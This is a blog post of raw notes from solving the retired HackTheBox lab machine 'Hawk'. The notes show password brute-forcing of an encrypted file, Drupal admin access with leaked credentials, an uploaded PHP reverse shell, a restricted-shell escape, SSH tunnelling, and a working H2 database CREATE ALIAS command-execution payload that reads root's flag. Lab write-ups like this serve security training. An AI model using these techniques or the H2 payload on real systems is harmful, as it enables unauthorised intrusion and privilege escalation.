---
title: HackTheBox Notes - Hawk (ft. Procrastination)
category: infosec
date: 2019-02-13
thumbnail: hawk-thumb.png
tags: htb,htb-notes
description:
---

Due to my incredible laziness, my last HTB article was five months ago. This is because I can't be bothered to explain stuff in a proper walkthrough of the boxes, so here's something much easier: I'm just posting the notes I was writing down as I was going through the box.

This is probably what I'm going to keep doing for HTB from now on, I have another three boxes that I'll publish when they are retired. But worry not, I promise after those boxes, I'll have much higher quality notes that won't be a confusing and poorly written mess.

I'm also not doing those old thumbnails of the box identicons anymore because those are way to hard to draw on a touchpad.

- - - -

### Nmap Scan
```
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-05 18:11 AEDT
Nmap scan report for 10.10.10.102
Host is up (0.28s latency).
Not shown: 937 closed ports, 60 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)
|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)
|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.09 seconds
```

### FTP Server
`ftp://10.10.10.120`

* Allows anonymous login
* Only file in `messages/.drupal.txt.enc`
* Can’t download with `get` for some reason, so let’s just view it

```
ftp> get .drupal.txt.enc -
remote: .drupal.txt.enc
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
226 Transfer complete.
240 bytes received in 0.00 secs (5.8688 MB/s)
ftp>
```
Just a base64 string

* But decoding it makes some gibberish
```
justin@sierra-fc282: ~ # echo
"U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJbCmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQzQUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfyt4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=" | base64 --decode
<random giberish that breaks my mardown parser>
justin@sierra-fc282: ~ #
```

* Now as it turns out, I did in fact download it but I just didn’t see it because it was a hidden file and I was using a normal `ls`…
* Anyway, because of the `.enc` extension, I’m gonna go ahead and assume it’s encrypted with OpenSSL. So now we save the decoded version to a file
`cat drupal.txt.enc | base64 --decode > drupal.b64d.enc`
* Downloaded [this tool to bruteforce the password](https://github.com/glv2/bruteforce-salted-openssl)
* And now we try it with some basic options

```
root@kali:~/Documents/htb/hawk# /opt/file/bruteforce-salted-openssl/bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt -c aes256 -v 30 drupal.b64d.enc

Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 14344391
Tried passwords per second: 896524.437500
Last tried password: *7¡Vamos!

Password not found.
The file might have been encrypted with a different cipher or/and a
different digest (e.g. OpenSSL 1.0.x uses the MD5 digest by default
but OpenSSL 1.1.x uses SHA256 by default).
```
Nope. This might take a while…

* Okay let’s try it with a different digest `sha256`

```
root@kali:~/Documents/htb/hawk# /opt/file/bruteforce-salted-openssl/bruteforce-salted-openssl -t 6 -f /usr/share/wordlists/rockyou.txt -c aes256 -d sha256 -v 30 drupal.b64d.enc
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 32
Tried passwords per second: inf
Last tried password: hello

Password candidate: friends
```
That was easy. We were not here for a while, I lied

* Now we can decrypt it

```
root@kali:~/Documents/htb/hawk# openssl enc -d -aes256 -salt -in drupal.b64d.enc -out drupal.decrypted -k friends
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
root@kali:~/Documents/htb/hawk# cat drupal.decrypted
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```
Neato

### Drupal Web Portal
`http://10.10.10.102`

* Login with `Admin`:`PencilKeyboardScanner123`
* `admin/reports/status` says Drupal version is `7.58`
	*  `/CHANGELOG.txt` says it was patched for `CVE-2018-7600`
* Looks like we gotta upload a good ol’ PHP reverse shell.
	* First we need to allow Drupal to add PHP page snippets. In `admin/modules` tick the `PHP Filter` option
	* Go to `node/add/page` and upload the shellcode
	* You know the rest

### PHP Reverse Shell
* Logged in as `www-data`
* We have access to `/home/daniel/user.txt`. So just get that
- - - -
* Attempted to ssh with a password found in `/var/www/html/sites/default/settings.php ` - `drupal4hawk` with username `daniel`

### SSH Python Client
* `daniel` user uses a Python restricted shell. So yep
* Easy fix `import pty; pty.spawn(‘/bin/bash’)`

### SSH Bash Client
* Logged into mysql server with `drupal`:`drupal4hawk`
	* In `users` table

```
name: admin
pass: $S$DFw163ixD00W55hdCqtvCB13XOTLhZ0pt0FVpFy1Ntmdp5EAOX08
```
The hash is a special `sha512 (Drupal)` hash, so this is probably not where we are supposed to be

* Another database `h2` is running as root. We can access it on `10.10.10.102:8082`
	* But we get denied access because it only accepts connections from localhost, we need to set up a proxy
	* Create a new SSH session with `ssh -D 8080 daniel@10.10.10.102`
	* Setup Firefox to allow SOCKS proxy with `127.0.0.1:8080`
	* Now we can access it
* Looking back at `ps -aux` we see that the process is running without the `-user` or `-pass` args which means we can access it with default credentials
	* But, of course… this doesn’t work
	* [Frequently Asked Questions](http://www.h2database.com/html/faq.html#connect) for `h2` shows that the database may be stored somewhere different
	* Replaced `~/test` with `./data/test` and we’re in

### H2 Web Console
`10.10.10.102:8082`

* Looked for an exploit and [found this](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
* So in the console you run

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
CALL SHELLEXEC('cat /root/root.txt')
```
And it displays
```
CALL SHELLEXEC('cat /root/root.txt');
PUBLIC.SHELLEXEC('cat /root/root.txt')
54f3e840fe5564b42a8320fd2b608ba0
(1 row, 5 ms)
```
